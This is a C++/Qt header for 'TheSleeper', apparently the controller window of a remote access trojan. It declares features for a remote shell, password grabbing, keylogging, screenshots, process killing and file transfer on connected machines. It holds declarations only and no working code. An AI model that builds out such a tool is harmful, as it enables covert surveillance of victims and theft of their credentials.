//!
//!     Kaleidoscalp, all rights reserved.
//!

#ifndef _THE_SLEEPER_WINDOW_HPP_
#define _THE_SLEEPER_WINDOW_HPP_

#include <list>

#include <QStringListModel>
#include <QDirModel>
#include <QMainWindow>
#include <ui_TheSleeper.h>

#include "ClientTableModel.hpp"
#include "PasswordsDialog.hpp"
#include "EditClientDialog.hpp"

#include <common/Log.hpp>
#include <blaspheme/protocol/Session.hpp>
#include <network/TcpClient.hpp>

namespace TheSleeper
{
    using Network::TcpClient;
    using Blaspheme::Session;

    class ListeningThread;
    class GraphicTransferManager;
    class Client;
    
    typedef Client * ClientPtr;
    typedef std::list<ClientPtr> ClientPtrList;
    typedef std::list<ClientPtr>::iterator ClientPtrListIter;
    
    class ServerWindow : public QMainWindow, public Ui::MainWindow
    {
        Q_OBJECT

        public:
        
            ServerWindow(QWidget * parent = 0);
            virtual ~ServerWindow();
            //void addAuxClient(Network::TcpClient, Blaspheme::SessionId id);
            //void closeEvent(QCloseEvent *event);
            
        private:
        
            void createStatusBar();
            void updateConnected(const QString& ip, const QString& port);
            void updateDisconnected();
        
        private slots:        
        
            void onNewClient(Session session);
            void aboutQt();
            void about();
            
            // panneau de droite : gestion des clients
            void onListen();
            void onDisconnect();
            void onChangeClient(const QModelIndex &);
            
            // interface avec le thread des connexions
            void onDisconnectedClient();
            void switchClient();
            void onFailedAuth();
            
            // barre de menu : onglet client
            void configureOptions();

            // barre de menu : onglet serveur
            void shutdown();
            void reboot();
            void uninstall();
            void upgrade();

            // premier onglet : Controle Systeme Distant
            void remoteShutdown();
            void remoteReboot();
            void remoteHibernate();
            void remoteLogout();
            void remoteShell();
            void getPasswords();
            
            // 2eme onglet : gestionnaire de processus
            void updateProcessList();
            void killProcess();

            // 3eme onglet : screenshot
            void updateScreen();
            void saveScreen();

            // 4eme onglet : keylogger
            void showKeylog();
            void saveKeylog();

            // 5eme onglet : transfert de fichier
            void browseRemoteFiles(QModelIndex index);
            void startDownload();
            void startUpload();
        
        private:
        
            // Dialogue pour naviguer dans les mots de passe
            PasswordsDialog passwords_dialog;
            
            // Dialogue pour éditer des executables client
            EditClientDialog edit_client_dialog;
            
            // Thread d'ecoute des connexions principales et auxiliaires
            ListeningThread * listener;

            // listes de tous les clients connectes en ce moment
            ClientPtrList clients;
            
            // ce pointeur designe le serveur que l'on est en train de controler
            ClientPtrList::iterator currentClient;
            
            // Barre d'etat, montre les proprietes du serveur que l'on est en train de controler
            QLabel * connectionStatusLabel;
            QLabel * hostInfoIp;
            QLabel * hostInfoPort;
            QLabel * infoIp;
            QLabel * infoPort;
            
            ClientTableModel clientsModel;
            QModelIndex current_index;
            QStringListModel processModel;
            QDirModel localFilesModel;
    };

} // TheSleeper

#endif // _THE_SLEEPER_WINDOW_HPP_
